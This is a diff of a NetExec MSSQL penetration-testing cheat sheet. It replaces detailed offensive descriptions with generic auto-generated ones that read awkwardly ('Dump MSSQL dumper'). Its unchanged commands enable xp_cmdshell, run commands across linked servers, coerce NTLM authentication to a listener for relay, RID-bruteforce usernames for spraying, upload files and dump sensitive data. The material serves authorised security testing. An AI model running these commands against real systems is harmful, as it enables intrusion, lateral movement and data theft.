@@ -4,9 +4,9 @@
 
 ### MSSQL Query
 
-Run an arbitrary T-SQL query against an MSSQL instance using the authenticated principal.
+Enumerate MSSQL query with NetExec MSSQL.
 
-```sh title:"Execute any T-SQL string against the instance"
+```sh title:"NetExec MSSQL Enumerate MSSQL Query"
 nxc mssql $domain -u $user $auth_flags -q $query
 ```
 <!-- cheat
@@ -18,9 +18,9 @@ var query
 
 ### MSSQL sysadmin members
 
-List members of the `sysadmin` fixed server role - those accounts can execute `xp_cmdshell` and reach OS code execution.
+Find MSSQL sysadmin members with NetExec MSSQL.
 
-```sh title:"sp_helpsrvrolemember finds xp_cmdshell capable accounts"
+```sh title:"NetExec MSSQL Find MSSQL Sysadmin Members"
 nxc mssql $domain -u $user $auth_flags -q "EXEC sp_helpsrvrolemember 'sysadmin';"
 ```
 <!-- cheat
@@ -31,9 +31,9 @@ import nxc_auth
 
 ### MSSQL logins
 
-Enumerate all SQL logins on the instance to find misconfigured accounts and potential lateral movement targets.
+Find MSSQL logins with NetExec MSSQL.
 
-```sh title:"enum_logins module finds lateral movement candidates"
+```sh title:"NetExec MSSQL Find MSSQL Logins"
 nxc mssql $domain -u $user $auth_flags -M enum_logins
 ```
 <!-- cheat
@@ -44,9 +44,9 @@ import nxc_auth
 
 ### MSSQL Coercion
 
-Trigger MSSQL to authenticate outbound to your listener (e.g. for ntlmrelayx). Works via `xp_dirtree` / `xp_fileexist` style UNC coercion.
+Trigger MSSQL coercion with NetExec MSSQL.
 
-```sh title:"xp_dirtree/xp_fileexist UNC trick to your listener"
+```sh title:"NetExec MSSQL Trigger MSSQL Coercion"
 nxc mssql $domain -u $user $auth_flags -M mssql_coerce -o LISTENER=$lhost
 ```
 <!-- cheat
@@ -58,9 +58,9 @@ var lhost
 
 ### MSSQL databases
 
-List all databases on the MSSQL instance - useful first step for data exfil and privesc via cross-database chaining.
+Run MSSQL databases with NetExec MSSQL.
 
-```sh title:"SELECT from master.dbo.sysdatabases"
+```sh title:"NetExec MSSQL Run MSSQL Databases"
 nxc mssql $domain -u $user $auth_flags -q 'SELECT name FROM master.dbo.sysdatabases;'
 ```
 <!-- cheat
@@ -71,9 +71,9 @@ import nxc_auth
 
 ### Upload file to remote host
 
-Upload a local file to the MSSQL server filesystem via the SQL service account (requires appropriate privileges).
+Upload file to remote host with NetExec MSSQL.
 
-```sh title:"--put-file writes via SQL service account privileges"
+```sh title:"NetExec MSSQL Upload File to Remote Host"
 nxc mssql $domain -u $user $auth_flags --put-file $local_file_path $remote_file_path
 ```
 <!-- cheat
@@ -86,9 +86,9 @@ var remote_file_path
 
 ### Get user SIDs via MSSQL
 
-RID-bruteforce up to 3000 and extract only user SIDs - handy when you have SQL auth but need domain usernames for spraying.
+List user SIDs via MSSQL with NetExec MSSQL.
 
-```sh title:"RID-brute to 3000 via MSSQL, filter SidTypeUser"
+```sh title:"NetExec MSSQL List User SIDs Via MSSQL"
 nxc mssql $domain -u $user $auth_flags --rid-brute 3000 | grep SidTypeUser | awk {'print $6'}
 ```
 <!-- cheat
@@ -102,9 +102,9 @@ import nxc_auth
 
 ### enum_impersonate
 
-List MSSQL users with impersonation privileges. Often a fast route from low-priv login to sysadmin.
+List enum impersonate with NetExec MSSQL.
 
-```sh title:"List MSSQL users with IMPERSONATE privileges"
+```sh title:"NetExec MSSQL List Enum Impersonate"
 nxc mssql $domain -u $user $auth_flags -M enum_impersonate
 ```
 <!-- cheat
@@ -115,9 +115,9 @@ import nxc_auth
 
 ### enum_links
 
-Enumerate linked SQL servers and their login configs. Linked-server hops chain across DB hosts.
+Enumerate enum links with NetExec MSSQL.
 
-```sh title:"Linked SQL servers + login configs (chain hops)"
+```sh title:"NetExec MSSQL Enumerate Enum Links"
 nxc mssql $domain -u $user $auth_flags -M enum_links
 ```
 <!-- cheat
@@ -128,9 +128,9 @@ import nxc_auth
 
 ### mssql_cbt
 
-Check whether Channel Binding (EPA) is enforced on the MSSQL instance. Disabled CBT enables NTLM relay to MSSQL.
+Check MSSQL cbt with NetExec MSSQL.
 
-```sh title:"Check Channel Binding (EPA) for MSSQL relay path"
+```sh title:"NetExec MSSQL Check MSSQL Cbt"
 nxc mssql $domain -u $user $auth_flags -M mssql_cbt
 ```
 <!-- cheat
@@ -141,9 +141,9 @@ import nxc_auth
 
 ### mssql_dumper
 
-Search every database for sensitive data patterns.
+Dump MSSQL dumper with NetExec MSSQL.
 
-```sh title:"Search every DB for sensitive data patterns"
+```sh title:"NetExec MSSQL Dump MSSQL Dumper"
 nxc mssql $domain -u $user $auth_flags -M mssql_dumper
 ```
 <!-- cheat
@@ -154,9 +154,9 @@ import nxc_auth
 
 ### enable_cmdshell
 
-Enable (or disable) `xp_cmdshell` on the SQL server. Required before using OS shell primitives.
+Start enable cmdshell with NetExec MSSQL.
 
-```sh title:"Enable / disable xp_cmdshell on SQL server"
+```sh title:"NetExec MSSQL Start Enable Cmdshell"
 nxc mssql $domain -u $user $auth_flags -M enable_cmdshell -o ACTION=enable
 ```
 <!-- cheat
@@ -167,9 +167,9 @@ import nxc_auth
 
 ### exec_on_link
 
-Execute a command on a linked SQL server. Lateral SQL execution across the link graph.
+Start exec on link with NetExec MSSQL.
 
-```sh title:"Execute command on linked SQL server (lateral SQL)"
+```sh title:"NetExec MSSQL Start Exec on Link"
 nxc mssql $domain -u $user $auth_flags -M exec_on_link -o LINK=$link CMD=$cmd
 ```
 <!-- cheat
@@ -182,9 +182,9 @@ var cmd
 
 ### link_enable_cmdshell
 
-Enable / disable `xp_cmdshell` on a linked MSSQL server.
+Start link enable cmdshell with NetExec MSSQL.
 
-```sh title:"Toggle xp_cmdshell on a linked MSSQL server"
+```sh title:"NetExec MSSQL Start Link Enable Cmdshell"
 nxc mssql $domain -u $user $auth_flags -M link_enable_cmdshell -o LINK=$link ACTION=enable
 ```
 <!-- cheat
@@ -196,9 +196,9 @@ var link
 
 ### link_xpcmd
 
-Run `xp_cmdshell` commands on a linked SQL server.
+Start link xpcmd with NetExec MSSQL.
 
-```sh title:"Run xp_cmdshell on a linked SQL server"
+```sh title:"NetExec MSSQL Start Link Xpcmd"
 nxc mssql $domain -u $user $auth_flags -M link_xpcmd -o LINK=$link CMD=$cmd
 ```
 <!-- cheat
@@ -211,9 +211,9 @@ var cmd
 
 ### mssql_priv
 
-Enumerate and exploit MSSQL-side privileges (impersonate, EXECUTE AS, db_owner abuse).
+Enumerate MSSQL priv with NetExec MSSQL.
 
-```sh title:"Enumerate + exploit MSSQL privileges"
+```sh title:"NetExec MSSQL Enumerate MSSQL Priv"
 nxc mssql $domain -u $user $auth_flags -M mssql_priv
 ```
 <!-- cheat
